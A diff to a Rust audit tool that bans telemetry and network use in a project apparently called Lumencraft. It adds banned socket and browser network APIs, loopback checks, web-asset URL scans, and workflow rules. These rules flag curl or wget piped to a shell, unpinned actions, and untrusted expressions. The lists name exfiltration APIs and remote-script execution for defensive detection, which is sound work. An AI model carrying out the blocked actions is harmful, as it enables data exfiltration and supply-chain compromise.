@@ -8,8 +8,36 @@ use crate::licenses::parse_cargo_lock;
 
 const ALLOWED_LOOPBACK_NET_FILES: &[&str] = &["crates/ui-egui/src/control_io.rs", "crates/mcp/src/tools.rs", "apps/lumencraft/src/main.rs"];
 
-const ALWAYS_BANNED_NET_PATTERNS: &[&str] = &["UdpSocket", "ToSocketAddrs"];
+const ALWAYS_BANNED_NET_PATTERNS: &[&str] = &[
+    "UdpSocket",
+    "ToSocketAddrs",
+    "core::net",
+    "UnixStream",
+    "UnixListener",
+    "UnixDatagram",
+    "web_sys::WebSocket",
+    "web_sys::EventSource",
+    "web_sys::XmlHttpRequest",
+    "web_sys::Request",
+    "web_sys::Navigator",
+];
 const LOOPBACK_SCOPED_NET_PATTERNS: &[&str] = &["TcpStream", "TcpListener", "std::net"];
+
+const BANNED_WEB_SYS_NET_FEATURES: &[&str] = &[
+    "websocket",
+    "eventsource",
+    "xmlhttprequest",
+    "request",
+    "requestinit",
+    "requestmode",
+    "response",
+    "headers",
+    "navigator",
+    "worker",
+    "sharedworker",
+    "serviceworker",
+    "beacon",
+];
 
 const BANNED_WEB_AND_WORKFLOW_TERMS: &[&str] = &[
     "sonarcloud",
@@ -33,6 +61,11 @@ const BANNED_WEB_AND_WORKFLOW_TERMS: &[&str] = &[
     "sendbeacon",
     "xmlhttprequest",
     "new websocket",
+    "eventsource",
+    "new worker",
+    "new sharedworker",
+    "serviceworker",
+    "new image",
 ];
 
 const ALLOWED_HTML_EXTERNAL_URLS: &[&str] = &["http://www.w3.org/2000/svg", "http://www.w3.org/1999/xhtml"];
@@ -167,7 +200,40 @@ fn scan_manifest_for_banned_crates(rel: &str, toml: &str, violations: &mut Vec<T
                 detail: format!("banned telemetry/HTTP crate `{pkg}` (aliased via `package =`)"),
             });
         }
+        let is_web_sys_entry = key == "web-sys" || section_dependency_name(&section) == Some("web-sys") && key == "features";
+        if is_web_sys_entry {
+            for feat in extract_banned_web_sys_features(rhs) {
+                violations.push(TelemetryViolation {
+                    check: 1,
+                    path: rel.to_owned(),
+                    line: idx + 1,
+                    detail: format!("banned `web-sys` network feature `{feat}` in `Cargo.toml`"),
+                });
+            }
+        }
     }
+}
+
+fn extract_banned_web_sys_features(rhs: &str) -> Vec<String> {
+    let mut hits = Vec::new();
+    let mut pos = 0usize;
+    let bytes = rhs.as_bytes();
+    while pos < bytes.len() {
+        let q = bytes[pos];
+        if (q == b'"' || q == b'\'')
+            && let Some(end) = rhs[pos + 1..].find(char::from(q))
+        {
+            let val = &rhs[pos + 1..pos + 1 + end];
+            let lower = val.trim().to_ascii_lowercase();
+            if BANNED_WEB_SYS_NET_FEATURES.contains(&lower.as_str()) {
+                hits.push(val.trim().to_owned());
+            }
+            pos = pos + 1 + end + 1;
+            continue;
+        }
+        pos += 1;
+    }
+    hits
 }
 
 fn scan_lock_for_banned_crates(lock_text: &str, lock_pkgs: &[crate::licenses::LockPackage], violations: &mut Vec<TelemetryViolation>) {
@@ -292,19 +358,83 @@ fn check_rust_network_primitives(root: &Path, violations: &mut Vec<TelemetryViol
 
 fn scan_rust_file_network(rel: &str, stripped: &StrippedRust, violations: &mut Vec<TelemetryViolation>) {
     scan_code_patterns(rel, &stripped.prod_code, 2, ALWAYS_BANNED_NET_PATTERNS, "banned network socket primitive", violations);
+    check_js_sys_network_strings(rel, stripped, violations);
 
     let allowed = ALLOWED_LOOPBACK_NET_FILES.contains(&rel);
     let mut scoped_hits = Vec::new();
     scan_code_patterns(rel, &stripped.prod_code, 2, LOOPBACK_SCOPED_NET_PATTERNS, "unapproved std::net / TCP usage", &mut scoped_hits);
 
-    if scoped_hits.is_empty() {
-        return;
-    }
     if !allowed {
         violations.extend(scoped_hits);
         return;
     }
-    if !has_loopback_guard(&stripped.prod_code, &stripped.no_comments_code) {
+    check_allowlisted_net_file(rel, stripped, &scoped_hits, violations);
+}
+
+fn check_js_sys_network_strings(rel: &str, stripped: &StrippedRust, violations: &mut Vec<TelemetryViolation>) {
+    let uses_wasm_bridge =
+        stripped.prod_code.contains("js_sys") || stripped.prod_code.contains("web_sys") || stripped.prod_code.contains("wasm_bindgen");
+    if !uses_wasm_bridge {
+        return;
+    }
+    const BANNED_JS_LITERALS: &[&str] = &["fetch", "sendbeacon", "websocket", "eventsource", "xmlhttprequest"];
+    for (idx, line) in stripped.no_comments_code.lines().enumerate() {
+        let mut pos = 0usize;
+        let bytes = line.as_bytes();
+        while pos < bytes.len() {
+            if bytes[pos] == b'"'
+                && let Some(end_rel) = line[pos + 1..].find('"')
+            {
+                let lit = line[pos + 1..pos + 1 + end_rel].trim().to_ascii_lowercase();
+                if BANNED_JS_LITERALS.contains(&lit.as_str()) {
+                    violations.push(TelemetryViolation {
+                        check: 2,
+                        path: rel.to_owned(),
+                        line: idx + 1,
+                        detail: format!("forbidden JS network reflection string `\"{lit}\"` in WASM source"),
+                    });
+                }
+                pos = pos + 1 + end_rel + 1;
+                continue;
+            }
+            pos += 1;
+        }
+    }
+}
+
+fn check_allowlisted_net_file(rel: &str, stripped: &StrippedRust, scoped_hits: &[TelemetryViolation], violations: &mut Vec<TelemetryViolation>) {
+    check_net_alias_imports(rel, &stripped.prod_code, violations);
+
+    let fn_spans = collect_rust_fn_spans(&stripped.prod_code);
+    let mut checked_fn_sockets = 0usize;
+    for (start, end, line_no) in fn_spans {
+        let fn_prod = &stripped.prod_code[start..end];
+        if !fn_opens_socket(fn_prod) {
+            continue;
+        }
+        checked_fn_sockets += 1;
+        let fn_lits = stripped.no_comments_code.get(start..end).unwrap_or(fn_prod);
+        if !slice_has_loopback_guard(fn_prod, fn_lits) {
+            violations.push(TelemetryViolation {
+                check: 2,
+                path: rel.to_owned(),
+                line: line_no,
+                detail: String::from(
+                    "allowlisted network function lacks a loopback guard (`is_loopback`, `[127, 0, 0, 1]`, `127.0.0.1`, `::1`, or `LOCALHOST`)",
+                ),
+            });
+        }
+        if let Some((ip_line, bad_ip)) = find_non_loopback_ip_literal(fn_lits, line_no) {
+            violations.push(TelemetryViolation {
+                check: 2,
+                path: rel.to_owned(),
+                line: ip_line,
+                detail: format!("non-loopback socket literal `{bad_ip}` in allowlisted network function"),
+            });
+        }
+    }
+
+    if checked_fn_sockets == 0 && !scoped_hits.is_empty() && !slice_has_loopback_guard(&stripped.prod_code, &stripped.no_comments_code) {
         violations.push(TelemetryViolation {
             check: 2,
             path: rel.to_owned(),
@@ -316,9 +446,78 @@ fn scan_rust_file_network(rel: &str, stripped: &StrippedRust, violations: &mut V
     }
 }
 
-fn has_loopback_guard(prod_code: &str, no_comments_code: &str) -> bool {
+fn check_net_alias_imports(rel: &str, prod_code: &str, violations: &mut Vec<TelemetryViolation>) {
+    for (idx, line) in prod_code.lines().enumerate() {
+        let compact: String = line.chars().filter(|c| !c.is_whitespace()).collect();
+        if compact.contains("std::net::*") || compact.contains("std::netas") || (compact.contains("std::net") && line.contains(" as ")) {
+            violations.push(TelemetryViolation {
+                check: 2,
+                path: rel.to_owned(),
+                line: idx + 1,
+                detail: String::from("aliasing or wildcard-importing `std::net` is forbidden in allowlisted files"),
+            });
+        }
+    }
+}
+
+fn collect_rust_fn_spans(prod_code: &str) -> Vec<(usize, usize, usize)> {
+    let bytes = prod_code.as_bytes();
+    let mut spans = Vec::new();
+    let mut i = 0usize;
+    let mut line = 1usize;
+    while i < bytes.len() {
+        if bytes[i] == b'\n' {
+            line += 1;
+            i += 1;
+            continue;
+        }
+        let is_fn =
+            bytes[i..].starts_with(b"fn") && (i == 0 || !is_ident_byte(bytes[i - 1])) && bytes.get(i + 2).is_some_and(|b| b.is_ascii_whitespace());
+        if !is_fn {
+            i += 1;
+            continue;
+        }
+        let fn_start = i;
+        let fn_line = line;
+        let mut p = i + 2;
+        while p < bytes.len() && bytes[p] != b'{' && bytes[p] != b';' {
+            p += 1;
+        }
+        if bytes.get(p) != Some(&b'{') {
+            i += 2;
+            continue;
+        }
+        let mut depth = 1usize;
+        p += 1;
+        while p < bytes.len() && depth > 0 {
+            match bytes[p] {
+                b'{' => depth += 1,
+                b'}' => depth -= 1,
+                _ => {}
+            }
+            p += 1;
+        }
+        spans.push((fn_start, p, fn_line));
+        i += 2;
+    }
+    spans
+}
+
+fn fn_opens_socket(fn_prod: &str) -> bool {
+    fn_prod.contains("TcpListener::bind")
+        || fn_prod.contains("TcpStream::connect")
+        || ((fn_prod.contains("TcpListener") || fn_prod.contains("TcpStream") || fn_prod.contains("std::net"))
+            && (fn_prod.contains("::bind(") || fn_prod.contains("::connect(") || fn_prod.contains("connect_timeout(")))
+}
+
+fn slice_has_loopback_guard(prod_code: &str, no_comments_code: &str) -> bool {
     let compact: String = prod_code.chars().filter(|c| !c.is_whitespace()).collect();
-    if prod_code.contains("is_loopback") || compact.contains("[127,0,0,1]") || prod_code.contains("LOCALHOST") {
+    if prod_code.contains("is_loopback")
+        || prod_code.contains("validate_loopback_addr")
+        || prod_code.contains("bind_control_tcp_listener")
+        || compact.contains("[127,0,0,1]")
+        || prod_code.contains("LOCALHOST")
+    {
         return true;
     }
     for line in no_comments_code.lines() {
@@ -333,6 +532,40 @@ fn has_loopback_guard(prod_code: &str, no_comments_code: &str) -> bool {
         }
     }
     false
+}
+
+fn find_non_loopback_ip_literal(fn_lits: &str, base_line: usize) -> Option<(usize, String)> {
+    for (offset, line) in fn_lits.lines().enumerate() {
+        if line.contains("\"[::]\"") || line.contains("\"0.0.0.0") {
+            return Some((base_line + offset, String::from(if line.contains("0.0.0.0") { "0.0.0.0" } else { "[::]" })));
+        }
+        let mut pos = 0usize;
+        while let Some(q_rel) = line[pos..].find('"') {
+            let start = pos + q_rel + 1;
+            let Some(end_rel) = line[start..].find('"') else {
+                break;
+            };
+            let lit = &line[start..start + end_rel];
+            let host = lit.split(':').next().unwrap_or(lit);
+            if is_ipv4_dotted_quad(host) && !host.starts_with("127.") {
+                return Some((base_line + offset, lit.to_owned()));
+            }
+            pos = start + end_rel + 1;
+        }
+    }
+    None
+}
+
+fn is_ipv4_dotted_quad(s: &str) -> bool {
+    let mut parts = s.split('.');
+    let mut count = 0usize;
+    for part in &mut parts {
+        if part.is_empty() || part.parse::<u8>().is_err() {
+            return false;
+        }
+        count += 1;
+    }
+    count == 4
 }
 
 fn scan_code_patterns(rel: &str, code: &str, check: u8, patterns: &[&'static str], reason: &str, violations: &mut Vec<TelemetryViolation>) {
@@ -363,7 +596,9 @@ fn collect_non_test_src_rs_files(root: &Path, dir: &Path, out: &mut Vec<String>)
             collect_non_test_src_rs_files(root, &path, out)?;
         } else if path.extension().and_then(|e| e.to_str()) == Some("rs") {
             let rel = rel_slash(root, &path);
-            if rel.contains("/src/") && !rel.contains("/tests/") && !rel.ends_with("_test.rs") {
+            let is_prod_src = rel.contains("/src/") && !rel.contains("/tests/") && !rel.ends_with("_test.rs");
+            let is_build_rs = rel == "build.rs" || rel.ends_with("/build.rs");
+            if is_prod_src || is_build_rs {
                 out.push(rel);
             }
         }
@@ -372,7 +607,7 @@ fn collect_non_test_src_rs_files(root: &Path, dir: &Path, out: &mut Vec<String>)
 }
 
 /// Check 3: scan `.github/workflows/*.yml`, `apps/lumencraft-web/**`, and `packaging/**` for
-/// telemetry/analytics/cloud-service markers and external HTTP(S) URLs in `index.html`.
+/// telemetry/analytics/cloud-service markers and external URLs / browser network APIs across web assets.
 fn check_web_and_workflow_telemetry(root: &Path, violations: &mut Vec<TelemetryViolation>) -> Result<usize, String> {
     let mut targets = collect_workflow_files(root)?;
     for dir_name in ["apps/lumencraft-web", "packaging"] {
@@ -385,6 +620,7 @@ fn check_web_and_workflow_telemetry(root: &Path, violations: &mut Vec<TelemetryV
     targets.dedup();
 
     let mut scanned = 0usize;
+    let mut web_asset_files = Vec::new();
     for rel in &targets {
         let bytes = std::fs::read(root.join(rel)).map_err(|e| format!("{rel}: {e}"))?;
         if bytes.contains(&0) {
@@ -393,26 +629,47 @@ fn check_web_and_workflow_telemetry(root: &Path, violations: &mut Vec<TelemetryV
         scanned += 1;
         let text = String::from_utf8_lossy(&bytes);
         scan_text_for_web_telemetry(rel, &text, violations);
+        if is_web_asset_file(rel) {
+            web_asset_files.push((rel.clone(), text.into_owned()));
+        }
     }
 
     let index_rel = "apps/lumencraft-web/index.html";
-    let index_path = root.join(index_rel);
-    if !index_path.is_file() {
+    if !root.join(index_rel).is_file() {
         violations.push(TelemetryViolation {
             check: 3,
             path: index_rel.to_owned(),
             line: 1,
             detail: String::from("missing apps/lumencraft-web/index.html"),
         });
-    } else {
-        let html = std::fs::read_to_string(&index_path).map_err(|e| format!("{index_rel}: {e}"))?;
-        scan_index_html_external_urls(index_rel, &html, violations);
+    }
+    for (rel, text) in web_asset_files {
+        scan_web_asset_external_urls_and_apis(&rel, &text, violations);
     }
 
     Ok(scanned)
 }
 
+fn is_web_asset_file(rel: &str) -> bool {
+    let in_web = rel.starts_with("apps/lumencraft-web/") || rel.starts_with("packaging/web/");
+    if !in_web {
+        return false;
+    }
+    matches!(
+        Path::new(rel).extension().and_then(|e| e.to_str()).map(|s| s.to_ascii_lowercase()).as_deref(),
+        Some("html" | "htm" | "js" | "mjs" | "ts" | "css")
+    )
+}
+
+fn is_browser_markup_or_script(rel: &str) -> bool {
+    matches!(
+        Path::new(rel).extension().and_then(|e| e.to_str()).map(|s| s.to_ascii_lowercase()).as_deref(),
+        Some("html" | "htm" | "js" | "mjs" | "ts" | "jsx" | "tsx")
+    )
+}
+
 fn scan_text_for_web_telemetry(rel: &str, text: &str, violations: &mut Vec<TelemetryViolation>) {
+    let check_fetch = is_browser_markup_or_script(rel);
     for (idx, line) in text.lines().enumerate() {
         let lower = line.to_ascii_lowercase();
         for &term in BANNED_WEB_AND_WORKFLOW_TERMS {
@@ -425,7 +682,7 @@ fn scan_text_for_web_telemetry(rel: &str, text: &str, violations: &mut Vec<Telem
                 });
             }
         }
-        if contains_browser_fetch_call(&lower) {
+        if check_fetch && contains_browser_fetch_call(&lower) {
             violations.push(TelemetryViolation {
                 check: 3,
                 path: rel.to_owned(),
@@ -455,18 +712,16 @@ fn contains_telemetry_term(lower_line: &str, term: &str) -> bool {
 
 fn contains_browser_fetch_call(lower_line: &str) -> bool {
     let bytes = lower_line.as_bytes();
-    let needle = "fetch(";
+    let needle = "fetch";
     let mut start = 0usize;
     while let Some(rel) = lower_line[start..].find(needle) {
         let pos = start + rel;
-        if pos == 0 {
-            return true;
-        }
-        let prev = bytes[pos - 1];
-        if prev != b'.' && !is_ident_byte(prev) {
-            return true;
-        }
-        if prev == b'.' && is_global_fetch_receiver(&lower_line[..pos]) {
+        let after_ws = lower_line[pos + needle.len()..].trim_start();
+        let followed_by_paren = after_ws.starts_with('(');
+        let left_is_ok = pos == 0
+            || (bytes[pos - 1] != b'.' && !is_ident_byte(bytes[pos - 1]))
+            || (bytes[pos - 1] == b'.' && is_global_fetch_receiver(&lower_line[..pos]));
+        if followed_by_paren && left_is_ok {
             return true;
         }
         start = pos + 1;
@@ -484,10 +739,11 @@ fn is_global_fetch_receiver(before_fetch: &str) -> bool {
     })
 }
 
-fn scan_index_html_external_urls(rel: &str, html: &str, violations: &mut Vec<TelemetryViolation>) {
-    for (idx, line) in html.lines().enumerate() {
+fn scan_web_asset_external_urls_and_apis(rel: &str, content: &str, violations: &mut Vec<TelemetryViolation>) {
+    let is_css = rel.ends_with(".css");
+    for (idx, line) in content.lines().enumerate() {
         let lower = line.to_ascii_lowercase();
-        for scheme in ["https://", "http://"] {
+        for scheme in ["https://", "http://", "wss://", "ws://"] {
             let mut start = 0usize;
             while let Some(offset) = lower[start..].find(scheme) {
                 let pos = start + offset;
@@ -499,11 +755,62 @@ fn scan_index_html_external_urls(rel: &str, html: &str, violations: &mut Vec<Tel
                         check: 3,
                         path: rel.to_owned(),
                         line: idx + 1,
-                        detail: format!("external URL `{url}` is forbidden in index.html"),
+                        detail: format!("external URL `{url}` is forbidden in web assets"),
                     });
                 }
                 start = pos + scheme.len();
             }
+        }
+        scan_protocol_relative_urls(rel, idx + 1, line, violations);
+        if !is_css {
+            scan_web_network_api_tokens(rel, idx + 1, &lower, violations);
+        }
+    }
+}
+
+fn scan_protocol_relative_urls(rel: &str, line_no: usize, line: &str, violations: &mut Vec<TelemetryViolation>) {
+    let bytes = line.as_bytes();
+    let mut pos = 0usize;
+    while let Some(offset) = line[pos..].find("//") {
+        let hit = pos + offset;
+        let prev_ok = hit > 0 && matches!(bytes[hit - 1], b'=' | b'"' | b'\'' | b'`' | b'(');
+        let after = &line[hit + 2..];
+        let end = after.find(|c: char| c.is_whitespace() || matches!(c, '"' | '\'' | '<' | '>' | ')' | ';' | '`' | ',')).unwrap_or(after.len());
+        let target = &after[..end];
+        let host = target.split('/').next().unwrap_or(target);
+        let looks_like_host = !host.is_empty()
+            && host.bytes().all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'-' | b':'))
+            && (host.contains('.') || host.eq_ignore_ascii_case("localhost"));
+        if prev_ok && looks_like_host {
+            violations.push(TelemetryViolation {
+                check: 3,
+                path: rel.to_owned(),
+                line: line_no,
+                detail: format!("protocol-relative external URL `//{target}` is forbidden in web assets"),
+            });
+        }
+        pos = hit + 2;
+    }
+}
+
+fn scan_web_network_api_tokens(rel: &str, line_no: usize, lower: &str, violations: &mut Vec<TelemetryViolation>) {
+    for api in ["websocket", "eventsource", "sharedworker", "serviceworker", "worker("] {
+        let mut start = 0usize;
+        while let Some(offset) = lower[start..].find(api) {
+            let pos = start + offset;
+            let bytes = lower.as_bytes();
+            let left_ok = pos == 0 || !is_ident_byte(bytes[pos - 1]);
+            let right_ok = api.ends_with('(') || pos + api.len() == bytes.len() || !is_ident_byte(bytes[pos + api.len()]);
+            if left_ok && right_ok {
+                violations.push(TelemetryViolation {
+                    check: 3,
+                    path: rel.to_owned(),
+                    line: line_no,
+                    detail: format!("forbidden browser network/worker API `{api}` in web asset"),
+                });
+                break;
+            }
+            start = pos + 1;
         }
     }
 }
@@ -548,6 +855,7 @@ fn audit_workflow_yaml(rel: &str, yaml: &str, violations: &mut Vec<TelemetryViol
         if let Some(run_col) = state.run_block_col {
             if raw.trim().is_empty() || leading_spaces(raw) > run_col {
                 flag_untrusted_event_expr(rel, line_no, raw, violations);
+                flag_remote_script_execution(rel, line_no, raw, violations);
                 continue;
             }
             state.run_block_col = None;
@@ -563,6 +871,7 @@ fn audit_workflow_yaml(rel: &str, yaml: &str, violations: &mut Vec<TelemetryViol
         if handle_permissions_line(rel, line_no, indent, trimmed, &mut state, violations) {
             continue;
         }
+        check_workflow_uses_sha(rel, line_no, code, violations);
         check_run_directive(rel, line_no, code, &mut state, violations);
     }
 
@@ -687,19 +996,50 @@ fn validate_permission_entry(
     }
 }
 
+fn check_workflow_uses_sha(rel: &str, line_no: usize, code: &str, violations: &mut Vec<TelemetryViolation>) {
+    let trimmed = code.trim_start();
+    let after_dash = trimmed.strip_prefix('-').map_or(trimmed, str::trim_start);
+    let Some(rhs) = after_dash.strip_prefix("uses:") else {
+        return;
+    };
+    let spec = unquote_yaml_scalar(rhs.trim());
+    if spec.starts_with("./") || spec.starts_with("../") {
+        return;
+    }
+    let valid_sha = spec.split_once('@').is_some_and(|(_, ref_part)| ref_part.len() == 40 && ref_part.bytes().all(|b| b.is_ascii_hexdigit()));
+    if !valid_sha {
+        violations.push(TelemetryViolation {
+            check: 4,
+            path: rel.to_owned(),
+            line: line_no,
+            detail: format!("GitHub Action `{spec}` must be pinned to a full 40-character commit SHA"),
+        });
+    }
+}
+
 fn check_run_directive(rel: &str, line_no: usize, code: &str, state: &mut WorkflowParseState, violations: &mut Vec<TelemetryViolation>) {
-    let Some((key_col, rhs)) = split_yaml_run_key(code) else {
+    let Some((key_col, key_name, rhs)) = split_yaml_script_key(code) else {
         return;
     };
     let trimmed_rhs = rhs.trim();
     if is_yaml_block_scalar(trimmed_rhs) {
         state.run_block_col = Some(key_col);
+    } else if let Some(inner) = trimmed_rhs.strip_prefix("run:") {
+        let val = inner.trim();
+        if is_yaml_block_scalar(val) {
+            state.run_block_col = Some(key_col);
+        } else {
+            flag_untrusted_event_expr(rel, line_no, val, violations);
+            flag_remote_script_execution(rel, line_no, val, violations);
+        }
     } else {
+        let _ = key_name;
         flag_untrusted_event_expr(rel, line_no, trimmed_rhs, violations);
+        flag_remote_script_execution(rel, line_no, trimmed_rhs, violations);
     }
 }
 
-fn split_yaml_run_key(code: &str) -> Option<(usize, &str)> {
+fn split_yaml_script_key(code: &str) -> Option<(usize, &'static str, &str)> {
     let indent = leading_spaces(code);
     let after_indent = &code[indent..];
     let (key_col, after_dash) = if let Some(rest) = after_indent.strip_prefix('-') {
@@ -711,7 +1051,15 @@ fn split_yaml_run_key(code: &str) -> Option<(usize, &str)> {
     } else {
         (indent, after_indent)
     };
-    after_dash.strip_prefix("run:").map(|rhs| (key_col, rhs))
+    for key in ["run:", "script:", "prepare:", "with:"] {
+        if let Some(rhs) = after_dash.strip_prefix(key) {
+            if key == "with:" && !rhs.trim_start().starts_with("run:") {
+                return None;
+            }
+            return Some((key_col, key, rhs));
+        }
+    }
+    None
 }
 
 fn is_yaml_block_scalar(rhs: &str) -> bool {
@@ -728,29 +1076,76 @@ fn flag_untrusted_event_expr(rel: &str, line_no: usize, text: &str, violations: 
         let expr_end = text[expr_start..].find("}}").map_or(text.len(), |end_rel| expr_start + end_rel);
         let expr = &text[expr_start..expr_end];
         let lower_compact: String = expr.chars().filter(|c| !c.is_whitespace()).map(|c| c.to_ascii_lowercase()).collect();
-        if has_github_event_ref(&lower_compact) {
+        if let Some(ref_kind) = untrusted_expr_kind(&lower_compact) {
             violations.push(TelemetryViolation {
                 check: 4,
                 path: rel.to_owned(),
                 line: line_no,
-                detail: String::from("untrusted `${{ github.event.* }}` interpolated directly in `run:` block (use `env:` instead)"),
+                detail: format!("untrusted `${{{{ {ref_kind} }}}}` interpolated directly in workflow script block (use `env:` instead)"),
             });
         }
         pos = (expr_end + 2).min(text.len());
     }
 }
 
-fn has_github_event_ref(lower_compact: &str) -> bool {
-    let needle = "github.event.";
+fn untrusted_expr_kind(lower_compact: &str) -> Option<&'static str> {
+    for (needle, label, needs_right_boundary) in [
+        ("github.event.", "github.event.*", false),
+        ("inputs.", "inputs.*", false),
+        ("github.head_ref", "github.head_ref", true),
+        ("github.ref_name", "github.ref_name", true),
+    ] {
+        if has_expr_token(lower_compact, needle, needs_right_boundary) {
+            return Some(label);
+        }
+    }
+    None
+}
+
+fn has_expr_token(lower_compact: &str, needle: &str, needs_right_boundary: bool) -> bool {
+    let bytes = lower_compact.as_bytes();
     let mut pos = 0usize;
     while let Some(rel) = lower_compact[pos..].find(needle) {
         let hit = pos + rel;
-        if hit == 0 || !is_ident_byte(lower_compact.as_bytes()[hit - 1]) {
+        let end = hit + needle.len();
+        let left_ok = hit == 0 || !is_ident_byte(bytes[hit - 1]);
+        let right_ok = !needs_right_boundary || end == bytes.len() || !is_ident_byte(bytes[end]);
+        if left_ok && right_ok {
             return true;
         }
         pos = hit + 1;
     }
     false
+}
+
+fn flag_remote_script_execution(rel: &str, line_no: usize, raw: &str, violations: &mut Vec<TelemetryViolation>) {
+    let code = strip_yaml_comment(raw).trim();
+    if code.is_empty() || code.starts_with('#') {
+        return;
+    }
+    let lower = code.to_ascii_lowercase();
+    if lower.contains("raw.githubusercontent.com/") && (lower.contains("/main/") || lower.contains("/master/") || lower.contains("latest")) {
+        violations.push(TelemetryViolation {
+            check: 4,
+            path: rel.to_owned(),
+            line: line_no,
+            detail: String::from("unpinned remote script URL off `main`/`master` branch is forbidden in workflows"),
+        });
+    }
+    let has_fetcher = contains_telemetry_term(&lower, "curl") || contains_telemetry_term(&lower, "wget");
+    if has_fetcher
+        && let Some((_, pipe_rhs)) = lower.split_once('|')
+        && ["sh", "bash", "zsh", "dash", "python", "sudo tar", "tar "]
+            .iter()
+            .any(|sink| pipe_rhs.split_whitespace().collect::<Vec<_>>().join(" ").contains(sink))
+    {
+        violations.push(TelemetryViolation {
+            check: 4,
+            path: rel.to_owned(),
+            line: line_no,
+            detail: String::from("piping remote download directly to shell or archive extractor without sha256sum verification is forbidden"),
+        });
+    }
 }
 
 /// Check 5: static web security & anti-telemetry headers in `packaging/web/_headers` and `packaging/web/.htaccess`.
@@ -933,6 +1328,36 @@ fn validate_required_web_headers(rel: &str, headers: &BTreeMap<String, (usize, S
             detail: String::from("missing `X-Content-Type-Options: nosniff` header"),
         }),
     }
+
+    validate_exact_header(rel, headers, "cross-origin-opener-policy", "Cross-Origin-Opener-Policy", "same-origin", violations);
+    validate_exact_header(rel, headers, "cross-origin-embedder-policy", "Cross-Origin-Embedder-Policy", "require-corp", violations);
+}
+
+fn validate_exact_header(
+    rel: &str,
+    headers: &BTreeMap<String, (usize, String)>,
+    key: &str,
+    display_name: &str,
+    expected: &str,
+    violations: &mut Vec<TelemetryViolation>,
+) {
+    match headers.get(key) {
+        Some((line, val)) if val.trim().eq_ignore_ascii_case(expected) => {
+            let _ = line;
+        }
+        Some((line, val)) => violations.push(TelemetryViolation {
+            check: 5,
+            path: rel.to_owned(),
+            line: *line,
+            detail: format!("`{display_name}` must be `{expected}`, found `{val}`"),
+        }),
+        None => violations.push(TelemetryViolation {
+            check: 5,
+            path: rel.to_owned(),
+            line: 1,
+            detail: format!("missing `{display_name}: {expected}` header"),
+        }),
+    }
 }
 
 fn validate_csp_directives(rel: &str, line: usize, csp: &str, violations: &mut Vec<TelemetryViolation>) {
@@ -947,6 +1372,19 @@ fn validate_csp_directives(rel: &str, line: usize, csp: &str, violations: &mut V
                 line,
                 detail: format!("`Content-Security-Policy` missing exact directive `{required}`"),
             });
+        }
+    }
+
+    for dir in &directives {
+        for tok in dir.split_whitespace().skip(1) {
+            if tok.contains("://") || tok.starts_with("//") || tok == "*" {
+                violations.push(TelemetryViolation {
+                    check: 5,
+                    path: rel.to_owned(),
+                    line,
+                    detail: format!("`Content-Security-Policy` forbids external origin `{tok}` in `{dir}`"),
+                });
+            }
         }
     }
 }
@@ -1329,7 +1767,7 @@ fn mask_cfg_test_items(code_bytes: &[u8], targets: &mut [&mut Vec<u8>]) {
     let mut i = 0usize;
     while i < code_bytes.len() {
         if code_bytes[i] == b'#'
-            && let Some(after_attr) = match_cfg_test_attr(code_bytes, i)
+            && let Some(after_attr) = crate::layers::match_cfg_test_attr(code_bytes, i)
         {
             let body_start = skip_following_attrs(code_bytes, after_attr);
             let item_end = find_item_end(code_bytes, body_start);
@@ -1345,28 +1783,6 @@ fn mask_cfg_test_items(code_bytes: &[u8], targets: &mut [&mut Vec<u8>]) {
         }
         i += 1;
     }
-}
-
-fn match_cfg_test_attr(bytes: &[u8], start: usize) -> Option<usize> {
-    if bytes.get(start) != Some(&b'#') || bytes.get(start + 1) != Some(&b'[') {
-        return None;
-    }
-    let mut p = start + 2;
-    let mut bracket_depth = 1usize;
-    while p < bytes.len() && bracket_depth > 0 {
-        match bytes[p] {
-            b'[' => bracket_depth += 1,
-            b']' => bracket_depth -= 1,
-            _ => {}
-        }
-        p += 1;
-    }
-    if bracket_depth != 0 {
-        return None;
-    }
-    let inner = std::str::from_utf8(&bytes[start + 2..p - 1]).ok()?;
-    let compact: String = inner.chars().filter(|c| !c.is_whitespace()).collect();
-    if compact == "cfg(test)" || (compact.starts_with("cfg(all(") && compact.contains("test")) { Some(p) } else { None }
 }
 
 fn skip_following_attrs(bytes: &[u8], mut pos: usize) -> usize {
@@ -1473,11 +1889,11 @@ mod tests {
         );
         dir.write(
             "packaging/web/_headers",
-            "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n",
+            "/*\n  Content-Security-Policy: default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\n  Referrer-Policy: no-referrer\n  Permissions-Policy: camera=(), microphone=(), geolocation=()\n  X-Content-Type-Options: nosniff\n  Cross-Origin-Opener-Policy: same-origin\n  Cross-Origin-Embedder-Policy: require-corp\n",
         );
         dir.write(
             "packaging/web/.htaccess",
-            "<IfModule mod_headers.c>\n  Header always set Content-Security-Policy \"default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\"\n  Header always set Referrer-Policy \"no-referrer\"\n  Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n  Header always set X-Content-Type-Options \"nosniff\"\n</IfModule>\n",
+            "<IfModule mod_headers.c>\n  Header always set Content-Security-Policy \"default-src 'self'; connect-src 'self'; object-src 'none'; frame-ancestors 'none'; base-uri 'self'; form-action 'none'\"\n  Header always set Referrer-Policy \"no-referrer\"\n  Header always set Permissions-Policy \"camera=(), microphone=(), geolocation=()\"\n  Header always set X-Content-Type-Options \"nosniff\"\n  Header always set Cross-Origin-Opener-Policy \"same-origin\"\n  Header always set Cross-Origin-Embedder-Policy \"require-corp\"\n</IfModule>\n",
         );
         dir.write("packaging/windows/check.ps1", "while ($null -ne ($record = $view.Fetch())) {}\n");
         dir
@@ -1617,5 +2033,60 @@ mod tests {
             "{hits2:?}"
         );
         assert!(hits2.iter().any(|v| v.check == 5 && v.path == "packaging/web/.htaccess" && v.detail.contains("Referrer-Policy")), "{hits2:?}");
+    }
+
+    #[test]
+    fn r2_s13_02_04_05_06_07_telemetry_regression_matrix() {
+        // R2-S13-02 & R2-S13-04: with: run:, script:, prepare:, inputs.*, ref_name, SHA pins, curl|bash
+        let dir_wf = create_clean_fixture("r2-wf");
+        dir_wf.write(
+            ".github/workflows/ci.yml",
